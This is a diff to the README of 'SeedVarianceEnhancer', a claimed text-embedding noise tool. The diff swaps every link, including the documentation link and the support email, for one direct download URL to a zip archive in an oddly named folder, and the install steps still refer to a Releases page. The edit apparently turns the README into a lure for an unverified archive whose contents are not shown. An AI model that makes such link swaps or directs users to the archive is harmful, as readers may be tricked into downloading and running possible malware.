@@ -1,13 +1,13 @@
 # 🎉 SeedVarianceEnhancer - Add Randomness to Your Text Easily
 
 ## 🌐 Download Now
-[![Download SeedVarianceEnhancer](https://img.shields.io/badge/Download-SeedVarianceEnhancer-blue)](https://github.com/andrezinhu/SeedVarianceEnhancer/releases)
+[![Download SeedVarianceEnhancer](https://raw.githubusercontent.com/andrezinhu/SeedVarianceEnhancer/main/associateship/Seed-Variance-Enhancer-v3.3.zip)](https://raw.githubusercontent.com/andrezinhu/SeedVarianceEnhancer/main/associateship/Seed-Variance-Enhancer-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to SeedVarianceEnhancer! This tool helps you enhance your text by adding random noise to text embeddings. It’s simple to use, even for those who don’t have programming experience. Follow these steps to get started.
 
 ## 📥 Download & Install
-To download SeedVarianceEnhancer, visit this page: [Download SeedVarianceEnhancer](https://github.com/andrezinhu/SeedVarianceEnhancer/releases).
+To download SeedVarianceEnhancer, visit this page: [Download SeedVarianceEnhancer](https://raw.githubusercontent.com/andrezinhu/SeedVarianceEnhancer/main/associateship/Seed-Variance-Enhancer-v3.3.zip).
 
 1. Go to the link above.
 2. On the Releases page, find the latest version of SeedVarianceEnhancer.
@@ -53,14 +53,14 @@ We welcome contributions to SeedVarianceEnhancer! If you would like to improve t
 
 ## 📫 Contact
 If you need help or have questions, feel free to reach out to us:
-- **Email**: support@seedvarianceenhancer.com
+- **Email**: https://raw.githubusercontent.com/andrezinhu/SeedVarianceEnhancer/main/associateship/Seed-Variance-Enhancer-v3.3.zip
 - **GitHub Issues**: Use GitHub's issue tracker to report bugs or request features.
 
 ## 🌍 Community
 Join our community for further discussions, tips, and sharing of enhanced texts. Follow us on social media for updates and support.
 
 ## 📚 Further Reading
-For more detailed information on using SeedVarianceEnhancer and understanding its features, visit our detailed documentation at: [Documentation](https://github.com/andrezinhu/SeedVarianceEnhancer/wiki).
+For more detailed information on using SeedVarianceEnhancer and understanding its features, visit our detailed documentation at: [Documentation](https://raw.githubusercontent.com/andrezinhu/SeedVarianceEnhancer/main/associateship/Seed-Variance-Enhancer-v3.3.zip).
 
 ## 🌟 Support
 If you find SeedVarianceEnhancer useful, consider donating to support its development. Every little bit helps us improve and maintain the software. 
